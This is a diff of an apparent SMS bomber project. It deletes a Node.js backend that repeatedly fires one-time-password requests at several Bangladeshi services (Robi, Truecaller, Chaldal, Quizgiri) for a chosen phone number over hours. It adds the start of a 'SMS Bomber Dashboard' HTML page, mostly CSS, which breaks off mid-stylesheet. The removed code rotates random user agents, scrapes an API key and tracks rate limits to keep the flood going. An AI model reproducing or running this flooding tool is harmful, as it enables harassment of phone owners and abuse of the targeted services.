@@ -1,379 +1,2260 @@
 
-const axios = require("axios");
-const fs = require("fs");
-const path = require("path");
-const express = require("express"); // Added express for better routing
-
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-const admin = ["01882030871", "01518931383"];
-let ioInstance;
-
-function attachIO(io) {
-  ioInstance = io;
-}
-
-// Random User-Agent generator
-function randomUserAgent() {
-  const agents = [
-    // Windows
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/114.0.5735.199 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
-    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.2088.76 Safari/537.36 Edg/118.0.2088.76",
-
-    // MacOS
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.5 Safari/605.1.15",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 Version/15.6 Safari/605.1.15",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7) AppleWebKit/605.1.15 Version/14.1 Safari/605.1.15",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/537.36 Chrome/113.0.5672.126 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.3; rv:112.0) Gecko/20100101 Firefox/112.0",
-
-    // Linux
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/117.0.5938.92 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
-
-    // Android
-    "Mozilla/5.0 (Linux; Android 12; SM-M315F) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 Chrome/117.0.5938.92 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 Chrome/116.0.5845.163 Mobile Safari/537.36",
-    "Mozilla/5.0 (Android 13; Mobile; rv:118.0) Gecko/118.0 Firefox/118.0",
-    "Mozilla/5.0 (Android 12; Mobile; rv:117.0) Gecko/117.0 Firefox/117.0",
-
-    // iOS
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 Version/15.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/537.36 CriOS/112.0.5615.70 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) Gecko/20100101 Firefox/117.0 Mobile/15E148",
-
-    // ChromeOS & Others
-    "Mozilla/5.0 (X11; CrOS x86_64 15474.41.0) AppleWebKit/537.36 Chrome/117.0.5938.115 Safari/537.36",
-    "Mozilla/5.0 (Linux; U; Android 9; en-US; Redmi Note 8) AppleWebKit/537.36 Chrome/111.0.0.0 Mobile Safari/537.36"
-  ];
-
-  // Randomly return one
-  return agents[Math.floor(Math.random() * agents.length)];
-}
-
-// Example usage
-console.log(randomUserAgent());
-
-// Sleep function
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-// Load config
-const configPath = path.join(__dirname, "config.json");
-let config = { targets: [] };
-if (fs.existsSync(configPath)) {
-  config = JSON.parse(fs.readFileSync(configPath, "utf8"));
-}
-
-// History file
-const historyPath = path.join(__dirname, "history.json");
-let history = [];
-if (fs.existsSync(historyPath)) {
-  try {
-    history = JSON.parse(fs.readFileSync(historyPath, "utf8"));
-  } catch (e) {
-    console.log("Error loading history, starting fresh");
-  }
-}
-
-// Prepare target with dynamic keys
-async function prepareTarget(target) {
-  if (target.name === "Quizgiri") {
-    try {
-      const res = await axios.get("https://app.quizgiri.com.bd/");
-      const match = res.data.match(/x-api-key\s*=\s*"(.+?)"/);
-      if (match) target.headers["x-api-key"] = match[1];
-    } catch {}
-  }
-}
-
-// Send request
-async function sendRequest(target, number, bomberData) {
-  try {
-
-
-
-
-    if (target.name === "Robi") {
-  const body = [
-    { msisdn: number }
-  ];
-
-  const url = target.base + target.route;
-
-  const res = await axios.post(url, body, {
-    headers: {
-      ...(target.headers || {}),
-      "User-Agent": randomUserAgent()
-    },
-    validateStatus: () => true
-  });
-
-  if (res.status >= 200 && res.status < 300) {
-    console.log(`[✔] ${target.name} → OTP sent to ${number}`);
-  } else if (res.status === 429) {
-    console.log(`[⚠] ${target.name} Rate Limited → ${number}`);
-  } else {
-    console.log(`[✘] ${target.name} Failed → ${number} | Status: ${res.status}`);
-  }
-  return;
-}
-
-
-    if (target.name === "Truecaller") {
-  const body = {
-    phone: parseInt("88" + number),  // phone number integer আকারে
-    countryCode: "bd"
-  };
-
-  const url = target.base + target.route;
-
-  const res = await axios.post(url, body, {
-    headers: {
-      ...(target.headers || {}),
-      "User-Agent": randomUserAgent()
-    },
-    validateStatus: () => true
-  });
-
-  if (res.status >= 200 && res.status < 300) {
-    console.log(`[✔] ${target.name} → OTP sent to ${number}`);
-  } else if (res.status === 429) {
-    console.log(`[⚠] ${target.name} Rate Limited → ${number}`);
-  } else {
-    console.log(`[✘] ${target.name} Failed → ${number} | Status: ${res.status}`);
-  }
-  return;
-}
-
-
-    if (target.name === "Chaldal") {
-      const queryParams = {};
-      for (const key in target.queryParamsTemplate) {
-        queryParams[key] = target.queryParamsTemplate[key].replace("__NUMBER__", number);
-      }
-      const url = target.base + "?" + new URLSearchParams(queryParams).toString();
-
-      const startTime = Date.now();
-      const res = await axios.post(url, {}, { headers: target.headers });
-      const ping = Date.now() - startTime;
-      if (res.status >= 200 && res.status < 300) {
-        console.log(`[✔] ${target.name} → OTP sent to ${number}`);
-        bomberData.totalSent++;
-        bomberData.successesPerTarget[target.name] = (bomberData.successesPerTarget[target.name] || 0) + 1;
-        bomberData.lastPing = ping;
-      } else {
-        console.log(`[✘] ${target.name} Failed → ${number} | Status: ${res.status}`);
-        if (res.status !== 429) {
-          bomberData.failuresPerTarget[target.name] = (bomberData.failuresPerTarget[target.name] || 0) + 1;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Bomber Dashboard - Advanced Control Panel</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <style>
+        :root {
+            --primary: #9333ea;
+            --primary-dark: #7e22ce;
+            --primary-light: #a855f7;
+            --primary-glow: #c084fc;
+            --secondary: #ec4899;
+            --secondary-dark: #db2777;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --info: #3b82f6;
+            --dark: #0f0817;
+            --dark-card: #1a0f2e;
+            --dark-hover: #2e1065;
+            --light: #f3f4f6;
+            --gray: #9ca3af;
+            --border: rgba(147, 51, 234, 0.2);
+            --shadow: rgba(147, 51, 234, 0.4);
+            --gradient-1: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --gradient-2: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            --gradient-3: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            --gradient-purple: linear-gradient(135deg, #9333ea 0%, #ec4899 100%);
         }
-      }
-      return;
-    }
 
-    await prepareTarget(target);
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
 
-    let url = target.base + (target.route || "");
-    let body = {};
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
 
-    if (target.type === "GET") {
-      if (target.queryParam) {
-        url += "?" + new URLSearchParams({ [target.queryParam]: number }).toString();
-      } else {
-        url += number;
-      }
-    }
+        body {
+            background: var(--dark);
+            color: var(--light);
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
 
-    if (target.type === "POST" && target.bodyTemplate) {
-      body = JSON.parse(JSON.stringify(target.bodyTemplate).replace(/__NUMBER__/g, number));
-    }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(147, 51, 234, 0.3) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(236, 72, 153, 0.3) 0%, transparent 50%),
+                        radial-gradient(circle at 40% 20%, rgba(168, 85, 247, 0.2) 0%, transparent 50%);
+            z-index: -2;
+            animation: floatingGradient 20s ease-in-out infinite;
+        }
 
-    const startTime = Date.now();
-    const res = await axios({
-      method: target.type,
-      url,
-      headers: {
-        ...(target.headers || {}),
-        "User-Agent": randomUserAgent(),
-        "x-request-id": Math.random().toString(36).substring(2, 12)
-      },
-      data: body,
-      validateStatus: () => true
-    });
-    const ping = Date.now() - startTime;
+        @keyframes floatingGradient {
+            0%, 100% { transform: rotate(0deg) scale(1); }
+            33% { transform: rotate(120deg) scale(1.1); }
+            66% { transform: rotate(240deg) scale(0.95); }
+        }
 
-    if (res.status >= 200 && res.status < 300) {
-  console.log(`[✔] ${target.name} → OTP sent to ${number}`);
-  bomberData.totalSent++;
-  bomberData.successesPerTarget[target.name] = (bomberData.successesPerTarget[target.name] || 0) + 1;
-  bomberData.lastPing = ping;
+        #particles-js {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
 
-  // ✅ Socket.io real-time update পাঠাও
-  if (ioInstance) {
-    ioInstance.emit('bomber_update', {
-      number,
-      target: target.name,
-      totalSent: bomberData.totalSent,
-      lastPing: bomberData.lastPing,
-      status: "success"
-    });
-  }
-}
-  }
-  catch (err) {
-    console.error(`[✘] Error on ${target.name} → ${err.message}`);
-  }
-}
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
 
-// Bomber main function
-let activeBombers = {};
+        /* Advanced Header */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px;
+            background: linear-gradient(135deg, rgba(147, 51, 234, 0.1) 0%, rgba(236, 72, 153, 0.1) 100%);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            margin-bottom: 32px;
+            box-shadow: 0 20px 40px var(--shadow);
+            animation: slideDown 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            position: relative;
+            overflow: hidden;
+        }
 
-async function bomber(number, hours, password) {
-  const endTime = Date.now() + hours * 60 * 60 * 1000;
-  activeBombers[number] = {
-    active: true,
-    password,
-    startTime: Date.now(),
-    endTime,
-    totalSent: 0,
-    attempts: 0,
-    successesPerTarget: {},
-    failuresPerTarget: {},
-    lastPing: 0
-  };
+        header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(147, 51, 234, 0.1) 0%, transparent 70%);
+            animation: pulse 4s ease-in-out infinite;
+        }
 
-  let attempt = 0;
-  while (Date.now() < endTime && activeBombers[number] && activeBombers[number].active) {
-    attempt++;
-    console.log(`\n📌 Attempt #${attempt}`);
-    activeBombers[number].attempts = attempt;
-    for (const target of config.targets) {
-      if (activeBombers[number] && activeBombers[number].active) {
-        await sendRequest(target, number, activeBombers[number]);
-        await sleep(1000);
-      }
-    }
-  }
-  
-  if (activeBombers[number]) {
-    const data = { ...activeBombers[number], number, endTime: Date.now() };
-    delete data.active;
-    delete data.password;
-    history.push(data);
-    fs.writeFileSync(historyPath, JSON.stringify(history, null, 2));
-    delete activeBombers[number];
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.2); opacity: 0.8; }
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            z-index: 1;
+            position: relative;
+        }
+
+        .logo-icon {
+            width: 48px;
+            height: 48px;
+            background: var(--gradient-purple);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 30px rgba(147, 51, 234, 0.5);
+            animation: logoRotate 10s linear infinite;
+        }
+
+        @keyframes logoRotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .logo-icon i {
+            color: white;
+            font-size: 24px;
+            animation: bounce 2s ease-in-out infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .logo h1 {
+            font-size: 32px;
+            font-weight: 800;
+            background: var(--gradient-purple);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 40px rgba(147, 51, 234, 0.5);
+            animation: glow 3s ease-in-out infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% { filter: brightness(1); }
+            50% { filter: brightness(1.2); }
+        }
+
+        .header-info {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            z-index: 1;
+            position: relative;
+        }
+
+        .time-display {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            padding: 12px 20px;
+            background: rgba(147, 51, 234, 0.1);
+            border-radius: 16px;
+            border: 1px solid var(--border);
+        }
+
+        .time-display .time {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--primary-light);
+        }
+
+        .time-display .date {
+            font-size: 12px;
+            color: var(--gray);
+            margin-top: 4px;
+        }
+
+        /* Stats Cards with Advanced Animation */
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 24px;
+            margin-bottom: 32px;
+        }
+
+        .stat-card {
+            background: linear-gradient(135deg, rgba(147, 51, 234, 0.1) 0%, rgba(236, 72, 153, 0.05) 100%);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 24px;
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 0.8s ease-out forwards;
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .stat-card:nth-child(1) { animation-delay: 0.1s; }
+        .stat-card:nth-child(2) { animation-delay: 0.2s; }
+        .stat-card:nth-child(3) { animation-delay: 0.3s; }
+        .stat-card:nth-child(4) { animation-delay: 0.4s; }
+
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .stat-card:hover {
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 0 20px 40px rgba(147, 51, 234, 0.3);
+            border-color: var(--primary);
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: var(--gradient-purple);
+            transform: scaleX(0);
+            transform-origin: left;
+            transition: transform 0.4s ease;
+        }
+
+        .stat-card:hover::before {
+            transform: scaleX(1);
+        }
+
+        .stat-icon {
+            width: 56px;
+            height: 56px;
+            background: var(--gradient-purple);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+            box-shadow: 0 10px 30px rgba(147, 51, 234, 0.4);
+            animation: floatIcon 3s ease-in-out infinite;
+        }
+
+        @keyframes floatIcon {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(10deg); }
+        }
+
+        .stat-icon i {
+            color: white;
+            font-size: 24px;
+        }
+
+        .stat-value {
+            font-size: 36px;
+            font-weight: 800;
+            background: var(--gradient-purple);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 12px 0;
+            animation: countUp 1.5s ease-out;
+        }
+
+        @keyframes countUp {
+            from { opacity: 0; transform: scale(0.5); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .stat-label {
+            color: var(--gray);
+            font-size: 14px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .stat-change {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            margin-top: 8px;
+            padding: 4px 8px;
+            background: rgba(16, 185, 129, 0.1);
+            border-radius: 8px;
+            font-size: 12px;
+            color: var(--success);
+        }
+
+        /* Advanced Cards */
+        .card {
+            background: linear-gradient(135deg, rgba(147, 51, 234, 0.05) 0%, rgba(236, 72, 153, 0.02) 100%);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 28px;
+            margin-bottom: 32px;
+            box-shadow: 0 10px 40px rgba(147, 51, 234, 0.1);
+            animation: slideIn 0.8s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::after {
+            content: '';
+            position: absolute;
+            top: -100%;
+            left: -100%;
+            width: 300%;
+            height: 300%;
+            background: radial-gradient(circle, rgba(147, 51, 234, 0.05) 0%, transparent 70%);
+            animation: cardGlow 15s linear infinite;
+        }
+
+        @keyframes cardGlow {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 2px solid var(--border);
+            position: relative;
+            z-index: 1;
+        }
+
+        .card-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .card-title i {
+            font-size: 24px;
+            background: var(--gradient-purple);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .card-title h2 {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--light);
+        }
+
+        /* Badges */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 14px;
+            background: var(--gradient-purple);
+            color: white;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(147, 51, 234, 0.4);
+            animation: badgePulse 2s ease-in-out infinite;
+        }
+
+        @keyframes badgePulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .badge-success {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+        }
+
+        .badge-danger {
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+        }
+
+        .badge-warning {
+            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+        }
+
+        /* Form Controls */
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .form-group {
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--gray);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--primary);
+            font-size: 18px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px 16px 14px 48px;
+            background: rgba(147, 51, 234, 0.05);
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            color: var(--light);
+            font-size: 16px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: rgba(147, 51, 234, 0.1);
+            box-shadow: 0 0 0 4px rgba(147, 51, 234, 0.1),
+                        0 0 20px rgba(147, 51, 234, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .form-control::placeholder {
+            color: rgba(156, 163, 175, 0.5);
+        }
+
+        /* Buttons */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 14px 28px;
+            background: var(--gradient-purple);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(147, 51, 234, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .btn:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(147, 51, 234, 0.5);
+        }
+
+        .btn:active {
+            transform: translateY(-1px);
+        }
+
+        .btn-icon {
+            animation: btnIconRotate 2s linear infinite;
+        }
+
+        @keyframes btnIconRotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn-secondary {
+            background: linear-gradient(135deg, rgba(147, 51, 234, 0.2) 0%, rgba(236, 72, 153, 0.2) 100%);
+            color: var(--primary-light);
+            box-shadow: 0 10px 30px rgba(147, 51, 234, 0.2);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            box-shadow: 0 10px 30px rgba(239, 68, 68, 0.4);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.4);
+        }
+
+        /* Table Styles */
+        .table-wrapper {
+            overflow-x: auto;
+            border-radius: 16px;
+            background: rgba(147, 51, 234, 0.02);
+            border: 1px solid var(--border);
+            position: relative;
+            z-index: 1;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        thead {
+            background: rgba(147, 51, 234, 0.1);
+        }
+
+        th {
+            padding: 16px;
+            text-align: left;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--primary-light);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-bottom: 2px solid var(--border);
+        }
+
+        td {
+            padding: 16px;
+            color: var(--light);
+            border-bottom: 1px solid rgba(147, 51, 234, 0.1);
+            font-size: 14px;
+        }
+
+        tbody tr {
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        tbody tr:hover {
+            background: rgba(147, 51, 234, 0.05);
+            transform: scale(1.01);
+        }
+
+        tbody tr::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 3px;
+            background: var(--gradient-purple);
+            transform: scaleY(0);
+            transition: transform 0.3s ease;
+        }
+
+        tbody tr:hover::before {
+            transform: scaleY(1);
+        }
+
+        /* Progress Bar */
+        .progress-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: rgba(147, 51, 234, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--gradient-purple);
+            border-radius: 10px;
+            transition: width 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            animation: progressShine 2s linear infinite;
+        }
+
+        @keyframes progressShine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .progress-text {
+            font-size: 12px;
+            color: var(--primary-light);
+            margin-top: 6px;
+            font-weight: 600;
+        }
+
+        /* Status Indicators */
+        .status {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            position: relative;
+        }
+
+        .status::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            animation: statusPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes statusPulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.7; }
+        }
+
+        .status-active {
+            background: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+        }
+
+        .status-active::before {
+            background: #10b981;
+        }
+
+        .status-inactive {
+            background: rgba(239, 68, 68, 0.2);
+            color: #ef4444;
+        }
+
+        .status-inactive::before {
+            background: #ef4444;
+        }
+
+        .status-pending {
+            background: rgba(245, 158, 11, 0.2);
+            color: #f59e0b;
+        }
+
+        .status-pending::before {
+            background: #f59e0b;
+        }
+
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal {
+            background: linear-gradient(135deg, rgba(26, 15, 46, 0.95) 0%, rgba(46, 16, 101, 0.95) 100%);
+            width: 90%;
+            max-width: 500px;
+            border-radius: 24px;
+            padding: 32px;
+            box-shadow: 0 20px 60px rgba(147, 51, 234, 0.5);
+            transform: scale(0.8) translateY(20px);
+            transition: all 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            border: 1px solid var(--border);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .modal::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(147, 51, 234, 0.1) 0%, transparent 70%);
+            animation: modalGlow 10s linear infinite;
+        }
+
+        @keyframes modalGlow {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .modal-overlay.active .modal {
+            transform: scale(1) translateY(0);
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 24px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .modal-icon {
+            width: 48px;
+            height: 48px;
+            background: var(--gradient-purple);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 30px rgba(147, 51, 234, 0.4);
+        }
+
+        .modal-icon i {
+            color: white;
+            font-size: 24px;
+        }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--light);
+        }
+
+        .modal-body {
+            margin-bottom: 28px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .modal-footer {
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Toast Notifications */
+        .toast-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 10000;
+        }
+
+        .toast {
+            background: linear-gradient(135deg, rgba(26, 15, 46, 0.95) 0%, rgba(46, 16, 101, 0.95) 100%);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 16px 20px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            min-width: 300px;
+            box-shadow: 0 10px 30px rgba(147, 51, 234, 0.4);
+            animation: toastSlideIn 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes toastSlideIn {
+            from {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .toast-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .toast-success .toast-icon {
+            background: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+        }
+
+        .toast-error .toast-icon {
+            background: rgba(239, 68, 68, 0.2);
+            color: #ef4444;
+        }
+
+        .toast-warning .toast-icon {
+            background: rgba(245, 158, 11, 0.2);
+            color: #f59e0b;
+        }
+
+        .toast-info .toast-icon {
+            background: rgba(147, 51, 234, 0.2);
+            color: var(--primary);
+        }
+
+        .toast-content {
+            flex: 1;
+        }
+
+        .toast-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--light);
